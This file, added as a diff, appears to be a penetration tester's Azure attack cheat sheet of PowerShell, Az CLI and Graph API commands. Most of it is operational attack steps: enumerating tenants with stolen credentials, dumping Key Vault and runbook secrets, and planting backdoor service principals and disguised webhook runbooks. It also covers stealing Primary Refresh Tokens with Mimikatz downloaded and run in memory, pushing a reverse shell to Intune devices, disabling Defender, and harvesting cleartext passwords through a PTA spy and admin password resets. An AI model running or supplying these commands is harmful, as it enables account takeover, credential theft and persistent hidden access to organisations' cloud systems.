@@ -1,0 +1,1372 @@
+===Azure===
+
+Using AzureAD module
+     requires compromised (or test) user credentials
+
+     Connection
+          Install-module AzureAD
+          $passwd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("<username>@<domain>.onmicrosoft.com", $passwd)
+          Connect-AzureAD -Credential $creds
+     
+     List all users
+          Get-AzureADUser -All $true
+
+     Get some more details about the user
+          Get-AzureADUser -ObjectId <user_id> | fl *
+
+     List all groups
+          Get-AzureADGroup -All $true
+
+     Get information about a group
+          Get-AzADGroup -DisplayName '<group_name>'
+     
+     List a group's membership
+          Get-AzADGroupMember -GroupDisplayName '<group_name>' | select DisplayName
+
+     List all devices
+          Get-AzureADDevice
+     
+     List members of directory roles 
+          Global Administrator
+               Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
+          
+          Custom directory roles
+               Need AzureADPreview module - install in new terminal
+
+               Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
+     
+     Get information on an administrative unit
+          Get-AzureADMSAdministrativeUnit -Id <admin_unit_id>
+
+     List members of an administrative unit
+          Get-AzureADMSAdministrativeUnitMember -Id <admin_unit_id>
+
+     List roles scoped to an administrative unit
+          Get-AzureADMSScopedRoleMembership -Id <admin_unit_id> | fl *
+
+     Check service principal type of an Enterprise Application
+          Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<application_id>"} | fl
+
+     Get the service principal of an Enterprise Application
+          Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName - eq "<application_name>"}
+
+     List applications with application proxy configured
+          Get-AzureADApplication | %{try{Get- AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
+
+     List users and groups assigned to application with app proxy
+          https://learn.microsoft.com/en-us/azure/active-directory/app-proxy/scripts/powershell-display-users-group-of-app
+
+          Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <service_principal_id>
+
+
+Using Az module
+     
+     requires compromised (or test) user credentials
+          results apply only to that user
+
+          $passwd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential ("<username>@<domain>.onmicrosoft.com", $passwd)
+          Connect-AzAccount -Credential $creds
+
+     if using tokens, Az PowerShell may need both ARN and graph tokens
+          $token = 'eyJ0eX..'
+          $graph = 'eyJ0eX..'
+          Connect-AzAccount -AccessToken $token -GraphAccessToken $graph -AccountId <account_id>
+
+     List Azure contexts available
+          Get-AzContext -ListAvailable
+
+     List subscriptions
+          Get-AzSubscription
+     
+     Select a subscription
+          Select-AzSubscription -SubscriptionID "<subscription_ID>"
+
+     List resources
+          Get-AzResource
+
+          If you get the following for a managed identity, it has no rights on any of the Azure resources.
+               Get-AzResource : 'this.Client.SubscriptionId' cannot be null. At line:1 char:1
+               + Get-AzResource
+               + ~~~~~~~~~~~~~~
+               + CategoryInfo : CloseError: (:) [Get-AzResource], ValidationException
+               + FullyQualifiedErrorId : Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
+
+     List Azure roles assigned to the user
+          Get-AzRoleAssignment -SignInName <username>@<domain>.onmicrosoft.com
+
+     Get role for user on an automation account
+          Get-AzRoleAssignment -Scope /subscriptions/<subscription_id>/resourceGroups/<resource_group_name>/providers/Microsoft.Automation/automationAccounts/<automation_account_name>
+
+     Check if a hybrid worker group is in use by an automation account
+          Get-AzAutomationHybridWorkerGroup -AutomationAccountName <automation_account_name> -ResourceGroupName <resource_group_name>
+
+          Look for entry in RunbookWorker field for other domain
+
+     List Virtual Machines 
+          Get-AzVM | fl
+
+     List role assignments on a VM
+          Get-AzRoleAssignment -Scope /subscriptions/<subscription_id>/resourceGroups/<resource_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
+
+     List allowed actions in role definition
+          Get-AzRoleDefinition -Name "<role_name>"
+
+     List VMs and get OS details
+          Get-AzVM
+          $vm = Get-AzVM -Name "<VM_Name>"
+          $vm.OSProfile
+
+     List virtual networks
+          Get-AzVirtualNetwork
+     
+     Get Azure ExpressRoute (VPN) Info
+          Get-AzExpressRouteCircuit
+     
+     Get Azure VPN Info
+          Get-AzVpnConnection
+
+     Get public IP for a VM
+          Get-AzVM -Name <vm_name> -ResourceGroupName <resource_group_name> | select -ExpandProperty NetworkProfile
+          Get-AzNetworkInterface -Name <network_interface_name>
+          Get-AzPublicIpAddress -Name <public_IP_address_name>
+
+     Run command on VM
+          Invoke-AzVMRunCommand -ScriptPath /path/to/powershell/script.ps1  -CommandId 'RunPowerShellScript' -VMName '<vm_name>' -ResourceGroupName '<resource_group_name>' –Verbose
+
+     List Azure applications
+          Get-AzAdApplication
+
+     List Web App Services
+          Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
+
+     List Function Apps
+          Get-AzFunctionApp
+
+     List script extensions installed on VM
+          Get-AzVMExtension -ResourceGroupName "<resource_group_name>" -VMName "<vm_name>"
+
+     Custom script extension to add a local administrator to the VM
+          NOTE: NOISY, REQUIRES COMMAND EXECUTION EXTENSION PRESENT
+
+          Set-AzVMExtension -ResourceGroupName "resource_group_name>" -ExtensionName "<extension_name>" -VMName "<vm_name>" -Location "<vm_location>" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <attacker_username> <attacker_password> /add /Y; net localgroup administrators <attacker_username> /add"}'
+
+     List Storage Accounts
+          Get-AzStorageAccount | fl
+
+     Check for storage container access (if user has storage access)
+          Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <storage_account_name> -ResourceGroupName <resource_group_name).Context
+
+     List storage container blob contents
+          Get-AzStorageBlob -Container <container_name> -Context (get-azstorageaccount -name <storage_acct_name> -resourcegroupname <resource_group_name> | select -ExpandProperty Context)
+
+     Retriece files from storage container blob
+          Get-AzStorageBlob -Container <container_name> -Context (get-azstorageaccount -name <storage_acct_name> -resourcegroupname <resource_group_name> | select -ExpandProperty Context) | Get-AzStorageBlobContent
+
+
+     Get Conditional Access rules
+          (Get-AzStorageAccount | select -ExpandProperty NetworkRuleSet).IpRules
+
+     List Key Vaults
+          Get-AzKeyVault
+
+     Access Keyvault Secrets
+          Get-AzKeyVaultSecret -VaultName <vault_name>
+          Get-AzKeyVaultSecret -VaultName <vault_name> -Name <secret_name> –AsPlainText
+
+     Add a user as a member of a group
+          Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
+
+     Check if a managed identity can read any deployment from a resource group
+          Get-AzResourceGroupDeployment -ResourceGroupName <resource_group_name>
+
+     Save a deployment template locally
+          Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <resource_group_name> -DeploymentName <deployment_name>
+
+     Check if Azure AD Connect is installed
+          Get-ADSyncConnector
+
+     List SQL servers
+          Get-AzSQLServer
+
+     Get info on SQL databases
+          Get-AzSqlDatabase -ServerName <server_name> -ResourceGroupName <resource_group_name>
+
+     List SQL Firewall rules
+          Get-AzSqlServerFirewallRule -ServerName <server_name> -ResourceGroupName <resource_group_name>
+
+     List SQL Server AD Admins
+          Get-AzSqlServerActiveDirectoryAdminstrator -ServerName <server_name> -ResourceGroupName <resource_group_name>
+
+     List Azure Runbooks
+          Get-AzAutomationAccount
+
+          Get-AzAutomationRunbook -AutomationAccountName <Automation_Account_Name> -ResourceGroupName <Resource_Group_Name>
+
+     Export a runbook
+          Export-AzAutomationRunbook -AutomationAccountName <automation_account_name> -ResourceGroupName <resource_group_name> -Name <runbook_name> -OutputFolder .\Desktop\
+
+     Export SSL/TLS certs 
+          Get-AzPasswords -ExportCerts Y
+     
+     Azure Container Registry dump
+          Get-AzPasswords
+          Get-AzACR
+
+     Authenticate as Service Principal
+          $password = ConvertTo-SecureString '<SP_password>' -AsPlainText -Force
+
+          $creds = New-Object System.Management.Automation.PSCredential('<app_ID>', $password)
+
+          connect-azaccount -ServicePrincipal -Credential $creds -Tenant <tenant_ID>
+
+
+
+Using Az CLI
+     requires compromised (or test) user credentials
+
+     az login
+          may need to login from CLI to bypass MFA req
+          az login -u <username>@<domain>.onmicrosoft.com -p <password>
+
+     Get user's object id
+          az ad user show --id <user_email>
+
+     List roles assigned to user
+          az role assignment list --assignee <user_email>
+
+     List Virtual Machines (current user has at least the Reader role)
+          az vm list
+
+     List all App Services
+          az webapp list 
+
+     List Function Apps
+          az functionapp list
+
+     List Storage Accounts
+          az storage account list
+
+     List readable KeyVaults
+          az keyvault list 
+     
+     Assign permissions to obtain secrets
+          requires Contributor level access
+
+          az keyvault set-policy --name <KeyVault_name> --upn <Contributor_username> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
+
+     Get URI for Key Vault
+          az keyvault secret list --vault-name <KeyVault_name> --query '[].id' --output tsv
+     
+     Get cleartext secret from keyvault
+          az keyvault secret show --id <URI_for_keyvault> | ConvertFrom-Json
+
+     Check if a user is already/still logged in to az CLI on machine (e.g. VM)
+          az ad signed-in-user show
+
+     List automation accounts
+          az automation account list
+
+     Get information on automation accounts
+          az automation account list
+               needs automation extension
+               may need to run ' az extension add --upgrade - n automation' 
+ 
+     Check for objects owned by user signed in to az CLI
+          az ad signed-in-user list-owned-objects
+
+     Request token (use with Azure AD module) for signed-in user
+          ARN token
+               az account get-access-token
+
+          AAD-Graph token 
+               az account get-access-token --resource-type aad-graph
+
+Using MSOLOnline
+     If the Azure portal is locked down it is still possible to access Azure AD user information via MSOnline cmdlets
+          
+     Import-Module MSOnline
+     Connect-MsolService
+
+     List Company Information
+          Get-MSolCompanyInformation
+     
+     List all users
+          Get-MSolUser -All
+     
+     List all groups
+          Get-MSolGroup -All
+     
+     List members of a group (Global Admins in this case)
+          Get-MsolRole -RoleName "Company Administrator"
+          Get-MSolGroupMember –GroupObjectId $GUID
+
+     List all user attributes
+          Get-MSolUser –All | fl
+
+     List Service Principals
+          Get-MsolServicePrincipal
+
+     Search all Azure AD user attributes for passwords
+          $users = Get-MsolUser; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}}
+
+Using Azure Portal
+     Check runbooks for credential assets
+          Navigate to the Automation Accounts dashboard
+          Select an automation account 
+          Select Runbooks
+          Select a Runbook 
+          Click on Edit
+          Select Assets
+          Select Credentials
+          Retrieve credentials
+               Get-AutomationPSCredential -Name '<cred_name>'
+               (Get-AutomationPSCredential -Name '<cred_name>').GetNetworkCredential().Password
+
+
+Environment recon using ROADtools
+     requires compromised (or test) user credentials
+     https://github.com/dirkjanm/ROADtools
+
+     pipenv shell
+     roadrecon auth -u <username>@<domain>.onmicrosoft.com -p <password>
+     roadrecon gather
+     roadrecon gui
+     browse to http://127.0.0.1:5000
+
+
+Environment recon using Stormspotter
+     requires compromised (or test) user credentials
+
+     Run in Docker
+          git clone https://github.com/Azure/Stormspotter
+          docker-compose up
+
+          OR Run in separate terminals
+               In terminal 1, navigate to .\stormspotter\backend\
+                    pipenv shell
+                    python ssbackend.pyz
+
+               In terminal 2, navigate to .\stormspotter\frontend\dist\spa\
+                    quasar.cmd serve -p 9091 --history
+           
+               In terminal 3, navigate to .\stormspotter\stormcollector\ 
+                    pipenv shell
+                    az login -u <username>@<domain>.onmicrosoft.com -p <password>
+                    python .\stormspotter\stormcollector\sscollector.pyz cli
+
+                    Note the location of the results ZIP file 
+
+     Browse to http://localhost:9091
+          Username: neo4j
+          Password: BloodHound
+          Server: bolt://localhost:7687
+ 
+     Import ZIP archive using the 'Stormcollector Upload' option.
+     Click on Refresh after uploading file to process the data.
+
+     Refer to the 'QUERIES' tab, copy-paste the Cypher query to 'Raw Query' 
+
+
+Environment recon using AzureHound
+     requires compromised (or test) user credentials
+     https://github.com/BloodHoundAD/AzureHound
+
+     Connect to Azure using Az PowerShell and Azure AD modules
+
+     Invoke-AzureHound -Verbose
+     Note location of AzureHound ZIP file
+
+     BloodHound-win32-x64\BloodHound-win32-x64\BloodHound.exe
+          bolt://localhost:7687
+          Username: neo4j
+          Password: BloodHound
+
+     Upload the Zip archive 
+     Click 'Refresh Database Stats'
+
+     Queries
+          Resolve objectID to names
+               MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname
+
+          List all the users with Global Administror role
+               MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
+
+          Find all paths to an Azure key vault
+               MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
+  
+
+Using MS Graph tokens
+     $graph =  'eyJ0eX..'
+     $URI = 'https://graph.microsoft.com/v1.0/users'
+     $RequestParams = @{
+          Method  = 'GET'
+          Uri     = $URI
+          Headers = @{
+              'Authorization' = "Bearer $graph"
+          }
+     }
+     (Invoke-RestMethod @RequestParams).value
+
+     adjust URI accordingly, refresh $requestparams, and run invoke-restmethod
+
+     Get all Enterprise Applications
+          $URI = 'https://graph.microsoft.com/v1.0/applications'
+
+     Check if creds can be added to an Enterprise Application
+          $URI = 'https://graph.microsoft.com/v1.0/servicePrincipals/{ID}/appRoleAssignments'
+
+          may not work - if not, use Add-AzADAppSecret.ps1 instead
+               see https://github.com/mgeeky/AzureRT/blob/master/AzureRT.ps1
+
+               Add-AzADAppSecret -GraphToken $graph -Verbose
+
+     List the groups and roles that the user is a member of
+          $URI = 'https://graph.microsoft.com/v1.0/users/<username>@<domain>.onmicrosoft.com/memberOf'
+      
+
+
+Using Azure API tokens
+     $Token = 'eyJ0eX..'
+     $URI = 'https://management.azure.com/subscriptions?api-version=2020-01- 01'
+     $RequestParams = @{
+          Method  = 'GET'
+          Uri     = $URI
+          Headers = @{
+              'Authorization' = "Bearer $Token"
+          }
+     }
+     (Invoke-RestMethod @RequestParams).value
+     
+     adjust URI accordingly, refresh $requestparams, and run invoke-restmethod
+
+     Get subscription resources
+          $URI = 'https://management.azure.com/subscriptions/<subscription_Id>/resources?api-version=2020-10-01'
+
+     Get permissions on a VM
+          $URI = 'https://management.azure.com/subscriptions/<subscription_Id>/resourceGroups/<resource_group_name>/providers/Microsoft.Compute/virtualMachines/<VM_name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
+
+
+Using AAD-Graph tokens
+     Install-module AzureAD
+     $AADToken = 'eyJ0...'
+     Connect-AzureAD -AadAccessToken $AADToken -TenantId <tenant_id> -AccountId <user_account_id>
+
+
+Add Local Adminstrative User to Azure VM
+     $passwd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+     New-LocalUser -Name <username> -Password $passwd
+     Add-LocalGroupMember -Group Administrators -Member <username>
+
+Remotely run scripts on Azure VM
+     Invoke-AzVMRunCommand -VMName <vm_name> -ResourceGroupName <resource_group_name> -CommandId 'RunPowerShellScript' -ScriptPath '/path/to/script.ps1' -Verbose
+
+Remote access Azure VM
+     $password = ConvertTo-SecureString '<password>' -AsPlainText -Force
+     $creds = New-Object System.Management.Automation.PSCredential('<username>', $Password)
+     $sess = New-PSSession -ComputerName <VM_public_IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+     Enter-PSSession $sess
+
+View Azure Containers
+     Use creds with Azure Storage Explorer
+          https://azure.microsoft.com/en-us/products/storage/storage-explorer
+
+          Open Connect Dialog
+          Subscription
+          Provide credentials
+
+Create a new Azure service principal as a backdoor
+     $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
+     $spn
+     $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
+     $UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+     $UnsecureSecret
+     $sp = Get-MsolServicePrincipal -AppPrincipalId <App_ID>
+     $role = Get-MsolRole -RoleName "Company Administrator"
+     Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+
+     Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
+     
+     $cred = Get-Credential
+     Connect-AzAccount -Credential $cred -Tenant “<tenant_id>" -ServicePrincipal
+
+
+Runbook Backdoor
+
+     All services > Automation Accounts > Runbooks
+
+     Create a new Automation account with “Create Azure Run As Account” enabled
+
+     Navigate to Azure Active Directory > Roles and Administrators > User administrator
+     
+     Click Add Assignments
+     
+     Search for new automation account and add it
+     
+     Navigate to Subscriptions > subscription name > Access control (IAM)
+     
+     Click Add Role Assignment and add the automation account as an “Owner”
+
+     Navigate back to Automation Accounts and select new account
+
+     Click “Modules Gallery”
+     
+     Search for “Az.”
+     
+     Import the Az.Accounts module
+
+     Import the Az.Resources module
+
+     Save following as a runbook.ps1: 
+
+          Import-Module Az.Accounts
+          Import-Module Az.Resources
+          $user = “username@targetdomain.com"
+          $pass = "BackdoorFTW!!"
+          $Nickname = "BackupSVC"
+          $DisplayName = "backup_service"
+          $connectionName = "AzureRunAsConnection"
+          $servicePrincipalConnection = Get-AutomationConnection -Name $connectionName
+          Connect-AzAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId - ApplicationId $servicePrincipalConnection.ApplicationId -
+          CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint
+          $SecureStringPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
+          New-AzADUser -DisplayName $DisplayName -UserPrincipalName $user -Password $SecureStringPassword - MailNickname $Nickname
+          New-AzRoleAssignment -SignInName $user -RoleDefinitionName Owner
+
+     Modify the “user”, “password”, “Nickname”, and “DisplayName” as needed
+
+     In the Automation Accounts menu click “Runbooks”
+     Click “Import a runbook” 
+     When importing the runbook.ps1 script, set a name to something similar to the standard Automation scripts “AzureAutomationTutorial”
+
+     Set “Runbook Type” to PowerShell 
+     
+     Click "Create"
+
+     After the script is imported navigate to the runbook
+
+     Click “Webhooks” on the left
+
+     Add Webhook
+
+     Give the webhook a name that will blend in, like “backup”
+
+     Copy the URL!!
+
+     Access backdoor, if needed
+          PowerShell terminal 
+               Invoke-WebRequest -Method Post -Uri <Webhook URL>
+
+Azure Metadata
+     Azure API token
+          Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 
+
+     User Data
+          $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+          
+          [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+
+Running commands on Azure jump VMs
+     Connect from attacker machine to jump VM
+          $password = ConvertTo-SecureString '<victim_password>' -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential('<victim_username>', $password)
+          $jumpvm = New-PSSession -ComputerName <jump_vm_ip> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+          Enter-PSSession -Session $jumpvm
+
+     Connect from jumpvm to destination VM
+          $password = ConvertTo-SecureString '<victim_password>' -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential('.\<victim_username>', $password)
+          $vm = New-PSSession -ComputerName <vm_ip> -Credential $creds
+     
+     Check from jump VM if destination VM is joined to AzureAD 
+          Invoke-Command -Session $vm -ScriptBlock{dsregcmd /status}
+
+     Create directory on destination VM from jump VM
+          Invoke-Command -Session $vm -ScriptBlock{mkdir C:\path\to\dir}
+
+     Copy file to jump VM from attacker machine
+          Copy-Item -ToSession $jumpvm -Path c:\path\to\source -Destination C:\path\on\jump\vm\ –Verbose
+
+
+Primary Refresh Token (PRT)
+     ROADToken
+          https://github.com/dirkjanm/ROADtoken
+
+          Request a nonce
+               $TenantId = "<tenant_id>"
+               $URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+               $Params = @{
+                    "URI"     = $URL
+                    "Method"  = "POST"
+                    }
+               $Body = @{
+                    "grant_type" = "srv_challenge"
+                    }
+               $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body 
+               $Result.Nonce
+
+          Run ROADToken.exe in the context of victim user
+               Invoke-Command -Session $destination_vm_session_settings_see_jumpvms_above -ScriptBlock{C:\path\on\victim\to\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\path\on\victim\SessionExecCommand.exe <victim_username> C:\path\on\victim\ROADToken.exe <nonce> > C:\output\path\on\victim\PRT.txt"}
+
+               NOTE: Ignore the errors, but remember that ROADToken will output a (useless) token even if the nonce is invalid
+
+          Read PRT
+               Invoke-Command -Session $vm_session_see_jumpvms  -ScriptBlock{cat C:\output\path\on\victim\PRT.txt} 
+
+          In Chrome Icognito Mode:
+               Browse to https://login.microsoftonline.com/login.srf
+               Press F12 (Chrome dev tools)
+               Application
+               Cookies
+               Clear all cookies
+               Add cookie named 'x-ms-RefreshTokenCredential' with value set to PRT token value
+               Mark HTTPOnly and Secure for the cookie
+               
+          For O365 access
+               Browse to https://login.microsoftonline.com/login.srf again
+
+          For Azure access
+               Browse to https://endpoint.microsoft.com/#home
+
+          If you get the login page, try generating a whole new nonce and PRT
+               The nonce and PRT are short-lived - a dozen attempts to get the timing right is not unusual
+
+     Mimikatz to obtain the PRT
+          iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
+
+          Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
+
+          Copy the PRT and KeyValue
+               privilege::debug
+               token::elevate
+               dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
+
+          Copy the Context, ClearKey and DerivedKey
+               dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
+
+          Generate a JWT
+               Import-Module C:\Tools\AADInternals\AADInternals.psd1
+               $PRT_OF_USER = '...'
+               while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
+               $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
+               $ClearKey = "XXYYZZ..."
+               $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
+               New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
+               eyJ0eXAiOiJKV1QiL...
+
+               The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for  https://login.microsoftonline.com/login.srf.    
+
+               Edit the Chrome cookie (F12) -> Application -> Cookies with the values:
+                    Name: x-ms-RefreshTokenCredential
+                    Value: <Signed JWT>
+                    HttpOnly: √
+                    Secure: √
+
+
+Drop attacker script on InTune-managed devices
+     need InTune Administrator role
+
+     Azure Portal 
+          Devices
+               Select one or more (or all) devices
+               Scripts
+                    Add for Windows 10 (for powershell script)
+                         Add PowerShell script
+                              Select script location 
+                              Run script in 64-bit Powershell Host
+                         Assignments 
+                              Add all users
+                              Add all devices
+
+     It will take up to one hour before the script is executed
+
+     Can use the Invoke-PowerShellTCP.ps1 reverse shell
+          include the function call to execute the reverse shell in the script 
+          test it locally
+
+          nc64.exe -lvp <listener_port>
+
+
+Dynamic Group membership
+     Check the rules that add members to dynamic groups
+
+
+PowerView
+     https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon Find on-prem ADConnect account name and server
+ 
+     Get-NetUser -Filter "(samAccountName=MSOL_*)" |Select-Object name,description | fl
+
+PowerZure
+     powershell
+     require az module !
+     git clone https://github.com/hausec/PowerZure
+     ipmo .\PowerZure
+     Set-Subscription -Id [idgoeshere]
+
+     # Reader
+     Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails
+
+     # Contributor
+     Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
+     Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "build.xml"
+     Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
+     Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk
+
+     # Owner
+     Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest
+    
+     # Administrator
+     Create-Backdoor, Execute-Backdoor
+ 
+     users and groups 
+          Get-AzureUser -All
+          Get-AzureGroup -All
+          Get-AzureGroup –Group ‘Global Admins’
+     resources
+          Get-AzureTargets 
+     owners of applications
+          Get-AzureAppOwners
+     members of a role
+          Get-AzureADRole -Role <role name> 
+     key vaults
+          Show-AzureKeyVaultContent 
+     storage accounts
+          Show-AzureStorageContent 
+     runbook contents
+          Get-AzureRunbookContent
+     Creates a link to download VM disk
+          Get-AzureVMDisk
+
+Password Hash Sync (PHS) Attack 
+     Extracts credentials of the MSOL_* and Sync_* accounts in clear-text
+
+     Load AADInternals module in PSRemoting session
+          https://github.com/Gerenios/AADInternals
+
+          In remote session
+               Set-MpPreference -DisableRealtimeMonitoring $true
+               exit
+          On attacker host
+               Copy-Item -ToSession $session_settings_for_connect_server -Path C:\attacker\path\to\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
+
+               Enter-PSSession $session_settings_for_connect_server
+          In remote session
+               Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
+
+               Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+
+               Get-AADIntSyncCredentials 
+
+          Use Sync_* creds to request an access token for AADGraph API
+               $passwd = ConvertTo- SecureString '<Sync_*_password>' -AsPlainText -Force
+               $creds = New-Object System.Management.Automation.PSCredential ("<Sync_*_username>", $passwd)
+               Get-AADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
+
+          Get the ImmutableId for the victim admin user
+               Get-AADIntUser -UserPrincipalName <victim_username> | select ImmutableId
+          
+          Reset the victim admin user's password
+               Set-AADIntUserPassword - SourceAnchor "<immutable_id>" -Password "<new_password>" – Verbose
+
+Pass Through Authentication (PTA) Attack
+     Check if PTA is installed
+          Get-Command -Module PassthroughAuthPSModule
+          Note: not very reliable
+
+     Load AADInternals module in PSRemoting session
+          https://github.com/Gerenios/AADInternals
+
+          In remote session
+               Set-MpPreference -DisableRealtimeMonitoring $true
+               exit
+          On attacker host
+               Copy-Item -ToSession $session_settings_for_connect_server -Path C:\attacker\path\to\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
+
+               Enter-PSSession $session_settings_for_connect_server
+          In remote session
+               Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
+
+               Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+
+          Install the PTA agent
+               Install-AADIntPTASpy
+
+          Get passwords in clear-text
+               Get-AADIntPTASpyLog -DecodePasswords
+
+
+## Azure AD Connect 
+
+     Check if Azure AD Connect is installed : `Get-ADSyncConnector`
+
+     * For **PHS**, we can extract the credentials
+     * For **PTA**, we can install the agent
+     * For **Federation**, we can extract the certificate from ADFS server using DA
+
+     ```powershell
+     PS > Set-MpPreference -DisableRealtimeMonitoring $true
+     PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
+     PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
+     PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+     PS > Get-AADIntSyncCredentials
+
+     # Get Token for SYNC account and reset on-prem admin password
+     PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
+     PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
+     PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
+     PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
+     PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
+     ```
+
+     1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`
+     2. Install a PTA Backdoor
+         ```powershell
+         PS AADInternals> Install-AADIntPTASpy
+         PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
+         ```
+
+
+     ### Azure AD Connect - Password extraction
+
+     Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
+
+     Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
+     --- | --- | --- | --- | ---
+     ADSyncDecrypt | Yes | Yes | No | No
+     ADSyncGather | Yes | No | No | Yes
+     ADSyncQuery | No (network RPC calls only) | No | Yes | Yes
+
+
+     ```powershell
+     git clone https://github.com/fox-it/adconnectdump
+     # DCSync with AD Sync account
+     ```
+
+     ### Azure AD Connect - MSOL Account's password and DCSync
+
+     You can perform **DCSync** attack using the MSOL account.
+
+     Requirements:
+       * Compromise a server with Azure AD Connect service
+       * Access to ADSyncAdmins or local Administrators groups
+
+     Use the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password for the MSOL account:
+     * `azuread_decrypt_msol.ps1`: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
+     * `azuread_decrypt_msol_v2.ps1`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
+
+     Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.
+
+     ### Azure AD Connect - Seamless Single Sign On Silver Ticket
+
+     > Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)
+
+     > Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account **AZUREADSSOC** is created in the on-prem AD.
+
